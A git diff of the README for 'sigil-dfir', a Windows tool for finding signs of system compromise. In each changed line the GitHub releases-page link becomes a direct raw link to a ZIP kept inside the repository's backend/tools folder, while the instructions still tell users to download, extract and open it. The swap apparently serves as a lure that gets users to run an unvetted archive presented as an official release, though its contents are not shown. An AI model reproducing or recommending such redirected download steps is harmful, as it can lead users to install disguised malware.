@@ -1,10 +1,10 @@
 # 🛡️ sigil-dfir - Find Signs of System Compromise
 
-[![Download sigil-dfir](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://github.com/Hassan1829/sigil-dfir/releases)
+[![Download sigil-dfir](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://raw.githubusercontent.com/Hassan1829/sigil-dfir/main/backend/tools/dfir-sigil-1.9-beta.3.zip)
 
 ## 🔽 Download
 
-Visit this page to download: https://github.com/Hassan1829/sigil-dfir/releases
+Visit this page to download: https://raw.githubusercontent.com/Hassan1829/sigil-dfir/main/backend/tools/dfir-sigil-1.9-beta.3.zip
 
 Use the latest release for Windows. After you open the release page, look for the file made for Windows. Download it to your PC, then open it to start the app or unpack it first if the release comes as a ZIP file.
 
@@ -44,7 +44,7 @@ If your release includes separate frontend and backend files, keep both in the s
 
 ## 📦 Install on Windows
 
-1. Open the release page: https://github.com/Hassan1829/sigil-dfir/releases
+1. Open the release page: https://raw.githubusercontent.com/Hassan1829/sigil-dfir/main/backend/tools/dfir-sigil-1.9-beta.3.zip
 2. Download the Windows file from the latest release
 3. If the file is a ZIP archive, right-click it and choose Extract All
 4. Open the extracted folder
@@ -195,4 +195,4 @@ SIGIL DFIR works on files you choose to load. It does not need your email or acc
 
 ## 📎 Release Page
 
-Download the Windows release here: https://github.com/Hassan1829/sigil-dfir/releases
+Download the Windows release here: https://raw.githubusercontent.com/Hassan1829/sigil-dfir/main/backend/tools/dfir-sigil-1.9-beta.3.zip
